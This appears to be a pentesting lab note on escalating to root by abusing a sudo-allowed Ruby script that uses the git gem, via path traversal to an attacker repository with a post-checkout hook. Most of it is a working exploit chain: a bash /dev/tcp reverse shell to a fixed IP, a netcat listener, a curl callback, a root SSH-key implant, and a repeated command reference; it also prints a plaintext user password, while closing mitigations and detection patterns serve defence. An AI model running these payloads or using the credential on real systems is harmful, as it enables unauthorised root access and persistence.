## Overview

This privilege escalation path abuses a sudo-allowed Ruby script that uses the `git` Ruby gem to run Git operations as root.

If the script allows user-controlled repository paths or branch/ref values, it may be possible to point the script at an attacker-controlled Git repository containing malicious hooks.

The general path is:

```text
Obtain shell as low-privileged user
↓
Find user password or gain stable SSH access
↓
Check sudo permissions
↓
Identify Ruby script using git gem
↓
Review user-controlled input
↓
Create attacker-controlled Git repository
↓
Add malicious Git hook
↓
Run sudo script against attacker repository
↓
Git hook executes as root
```

Result:

```text
root shell
```

---

# Requirements

## Required Conditions

This technique requires:

```text
sudo permission to run a Ruby script as root
Ruby script uses the git gem or calls git operations
User can influence repository path or branch/ref
Attacker can create or control a Git repository
Git hook is triggered by the operation
```

## Example sudo Permission

```bash
sudo -l
```

Example output:

```text
User tom may run the following commands on fikklish:
    (ALL) /home/tom/checkout.rb
    (ALL) /home/tom/fetch.rb
```

This means the user can run both scripts as root.

---

# Initial Enumeration

## Check Current User

```bash
whoami
id
hostname
```

## Check sudo Rights

```bash
sudo -l
```

If prompted, provide the user’s password.

Example:

```text
tom/RapidlyLockstepDrenched103
```

> [!important]
> Always inspect any sudo-allowed script before running it. The privilege escalation path is often in how it handles user input.

---

# Vulnerable Script Pattern

## checkout.rb

```ruby
#!/usr/bin/ruby

require 'git'

puts "Name of the project: "
name = gets
g = Git.init('/root/projects/' + name.chomp)

puts "Location of branch: "
branch = gets
g.checkout(branch.chomp)
```

## What It Does

```text
Prompts for project name
↓
Initializes a Git repository at /root/projects/<user_input>
↓
Prompts for branch
↓
Runs git checkout <branch>
```

Important line:

```ruby
g = Git.init('/root/projects/' + name.chomp)
```

The script concatenates user input into a root-owned path:

```text
/root/projects/ + name
```

If path traversal is not blocked, input such as:

```text
../../home/tom/pwn
```

can redirect Git operations to:

```text
/home/tom/pwn
```

---

# fetch.rb

```ruby
#!/usr/bin/ruby

require 'git'

puts "Name of the project: "
name = gets
g = Git.init('/root/projects/' + name.chomp)

puts "Custom origin name, if applicable: "
origin = gets

puts "Location of branch: "
ref = gets
g.fetch(origin.chomp, {:ref => ref.chomp} )
```

## What It Does

```text
Prompts for project name
↓
Initializes a Git repository at /root/projects/<user_input>
↓
Prompts for origin
↓
Prompts for ref
↓
Runs git fetch with supplied values
```

Potential risks:

```text
user-controlled repository path
user-controlled origin
user-controlled ref
git operations run as root
hooks or git options may execute as root depending on operation and environment
```

---

# Why Git Hooks Matter

Git hooks are executable scripts stored in:

```text
.git/hooks/
```

They run automatically when certain Git actions occur.

Useful hooks include:

| Hook | Trigger |
|---|---|
| `post-checkout` | After `git checkout` |
| `post-merge` | After successful merge |
| `pre-commit` | Before commit |
| `post-commit` | After commit |
| `pre-push` | Before push |
| `post-rewrite` | After rewrite commands |

For this path, the key hook is:

```text
post-checkout
```

because the Ruby script calls:

```ruby
g.checkout(branch.chomp)
```

If `git checkout` runs as root inside an attacker-controlled repository, the hook executes as root.

---

# Exploitation Workflow

## Step 1 – Create Controlled Repository

Work from the low-privileged user’s home directory.

```bash
cd /home/tom
```

Clean and create repository directory:

```bash
rm -rf pwn && mkdir pwn && cd pwn
```

Initialize Git:

```bash
git init
```

Create a file:

```bash
echo "trigger" > trigger.txt
```

Add and commit:

```bash
git add trigger.txt
git commit -m "trigger"
```

> [!important]
> The repository needs at least one commit so checkout operations have a valid branch to operate on.

---

# Step 2 – Create Malicious post-checkout Hook

Create the hook:

```bash
cat > .git/hooks/post-checkout << 'EOF'
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.45.164/80 0>&1
EOF
```

Make it executable:

```bash
chmod +x .git/hooks/post-checkout
```

## Hook Breakdown

| Line | Purpose |
|---|---|
| `#!/bin/bash` | Execute hook with Bash |
| `/bin/bash -i` | Start interactive Bash |
| `/dev/tcp/<ip>/<port>` | Connect back to attacker |
| `0>&1` | Redirect stdin/stdout over socket |

---

# Step 3 – Start Listener

On the attack host:

```bash
nc -lvvp 80
```

---

# Step 4 – Trigger sudo checkout.rb

Run the sudo-allowed script and provide controlled input.

```bash
sudo /home/tom/checkout.rb << EOF
../../home/tom/pwn
master
EOF
```

Input meaning:

| Prompt | Supplied Value | Purpose |
|---|---|---|
| `Name of the project:` | `../../home/tom/pwn` | Path traversal to attacker-controlled repo |
| `Location of branch:` | `master` | Trigger checkout operation |

The script builds:

```text
/root/projects/../../home/tom/pwn
```

which resolves to:

```text
/home/tom/pwn
```

Then it runs Git checkout as root, triggering:

```text
/home/tom/pwn/.git/hooks/post-checkout
```

---

# Step 5 – Confirm Root Shell

Expected listener:

```text
connect to [192.168.45.164] from (UNKNOWN) [192.168.173.19]
root@fikklish:/home/tom/pwn#
```

Confirm:

```bash
whoami
id
hostname
```

Expected:

```text
root
uid=0(root)
```

---

# Why This Works

The issue is not Git itself.

The escalation happens because:

```text
sudo allows tom to run Ruby script as root
↓
Ruby script uses user input in a filesystem path
↓
Input is not sanitized
↓
Path traversal reaches attacker-controlled Git repository
↓
Script performs git checkout as root
↓
Git executes post-checkout hook from attacker repository
↓
Hook runs as root
```

The dangerous design pattern is:

```ruby
g = Git.init('/root/projects/' + name.chomp)
g.checkout(branch.chomp)
```

Problems:

```text
user-controlled path
no path normalization or validation
no restriction to intended project directory
Git operation executed as root
Git hooks not disabled
```

---

# Safer Exploitation Notes

## Use a Callback Test First

Instead of immediately spawning a shell, test execution safely:

```bash
cat > .git/hooks/post-checkout << 'EOF'
#!/bin/bash
curl http://192.168.45.164/git-hook-test
EOF
```

Start listener:

```bash
nc -lvvp 80
```

Then trigger the script.

If the callback hits, replace the hook with a shell payload.

---

# Alternate Payloads

## Bash Reverse Shell

```bash
/bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1
```

## Write Proof File

```bash
id > /tmp/git-hook-root.txt
```

## Add SSH Key for Root

```bash
mkdir -p /root/.ssh
echo '<public_key>' >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
```

> [!warning]
> Choose payloads based on the rules of engagement. Avoid persistent changes unless explicitly allowed.

---

# Decision Points

## Does sudo -l Show a Script?

If yes:

```text
Read the script.
Identify commands it runs.
Identify user-controlled input.
Check whether it runs as root.
Check whether it calls external tools.
```

## Does the Script Use Git?

Look for:

```text
require 'git'
Git.init
g.checkout
g.fetch
g.pull
g.clone
system("git ...")
backticks
exec
```

## Can You Control the Repository Path?

Look for concatenation such as:

```ruby
'/root/projects/' + name.chomp
```

Try path traversal:

```text
../../home/<user>/<repo>
```

## Can You Trigger a Hook?

Match the Git operation to a hook:

```text
checkout → post-checkout
merge → post-merge
commit → pre-commit/post-commit
fetch/pull → check applicable hooks and repo behavior
```

## Does the Hook Execute as Root?

Check with a safe proof:

```bash
id > /tmp/hook-test
```

Then inspect:

```bash
cat /tmp/hook-test
```

---

# Troubleshooting

## Git Commit Fails

Git may require username/email configuration.

Set locally:

```bash
git config user.email "tom@local"
git config user.name "tom"
```

Then commit again:

```bash
git add trigger.txt
git commit -m "trigger"
```

---

## Hook Does Not Run

Check:

```text
hook filename is correct
hook is executable
Git operation actually triggers that hook
repository has at least one commit
branch name is valid
script is using your repository path
path traversal resolved correctly
```

Verify hook permissions:

```bash
ls -la .git/hooks/post-checkout
```

Expected:

```text
-rwxr-xr-x
```

---

## No Reverse Shell

Check:

```text
listener is running
attacker IP is correct
port is reachable
target has outbound connectivity
payload syntax is correct
Bash supports /dev/tcp
firewall blocks port
```

Test with curl first:

```bash
curl http://<attacker_ip>/test
```

---

## sudo Script Rejects Path Traversal

If path traversal is blocked or normalized, look for:

```text
branch/ref injection
origin injection
environment variable influence
Git config injection
writable project directories
unsafe file permissions
other sudo-allowed scripts
```

---

# Command Reference

## Check sudo rights

```bash
sudo -l
```

## Read scripts

```bash
cat /home/tom/checkout.rb
```

```bash
cat /home/tom/fetch.rb
```

## Create repository

```bash
cd /home/tom
rm -rf pwn && mkdir pwn && cd pwn
git init
echo "trigger" > trigger.txt
git add trigger.txt
git commit -m "trigger"
```

## Set Git identity if commit fails

```bash
git config user.email "tom@local"
git config user.name "tom"
git commit -m "trigger"
```

## Create post-checkout hook

```bash
cat > .git/hooks/post-checkout << 'EOF'
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.45.164/80 0>&1
EOF
```

## Make hook executable

```bash
chmod +x .git/hooks/post-checkout
```

## Start listener

```bash
nc -lvvp 80
```

## Trigger sudo script

```bash
sudo /home/tom/checkout.rb << EOF
../../home/tom/pwn
master
EOF
```

## Confirm root

```bash
whoami
id
```

---

# Defensive Notes

## Root Cause

The sudo rule allows a low-privileged user to run a script as root.

The script then:

```text
accepts unsanitized user input
uses that input in a root-owned path
runs Git operations as root
does not disable hooks
does not restrict repository path
```

## Mitigations

Safer design:

```text
do not allow user-controlled paths in sudo scripts
validate project names against an allowlist
reject path traversal sequences
resolve canonical path and enforce it remains under intended directory
avoid running Git as root
disable Git hooks where possible
use absolute safe commands
avoid shell-interpreted input
apply least privilege to sudo rules
```

Ruby path validation example concept:

```ruby
base = File.realpath('/root/projects')
target = File.realpath(File.join(base, name.chomp))
abort 'Invalid path' unless target.start_with?(base + '/')
```

## sudoers Hardening

Avoid broad script execution where user input controls privileged operations.

Review:

```bash
sudo -l
```

Check sudoers entries for scripts that call:

```text
git
tar
find
rsync
cp
mv
bash
ruby
python
perl
vi
less
```

## Detection Ideas

Monitor for:

```text
sudo /home/tom/checkout.rb
sudo /home/tom/fetch.rb
Git hooks created in user directories
post-checkout executing shell commands
root-owned processes launched from Git hooks
bash -i /dev/tcp
unexpected access to /root/projects/../..
```

Suspicious process chain:

```text
sudo
↓
ruby checkout.rb
↓
git checkout
↓
.git/hooks/post-checkout
↓
bash
```

---

# Key Takeaways

- Always inspect scripts allowed by `sudo -l`.
- User-controlled input inside sudo scripts is dangerous.
- Ruby scripts using the `git` gem may trigger real Git behavior, including hooks.
- Git hooks execute with the privileges of the process running Git.
- If Git runs as root against an attacker-controlled repository, hooks may execute as root.
- Path traversal can redirect intended root paths to user-controlled repositories.
- `post-checkout` is the relevant hook when the privileged operation calls `git checkout`.
- Use safe callback tests before spawning shells.
- The fix is to avoid root Git execution on untrusted repositories and to strictly validate paths.

---

# Related Notes

- [[Linux Privilege Escalation]]
- [[sudo -l]]
- [[Git]]
- [[Git Hooks]]
- [[Ruby]]
- [[Path Traversal]]
- [[Sudo Script Abuse]]
- [[Linux Enumeration]]
- [[Reverse Shells]]
- [[GTFOBins]]

---

# Tags

#linux
#privilege-escalation
#sudo
#git
#git-hooks
#ruby
#path-traversal
#post-checkout
#reverse-shell
#offsec
#pentesting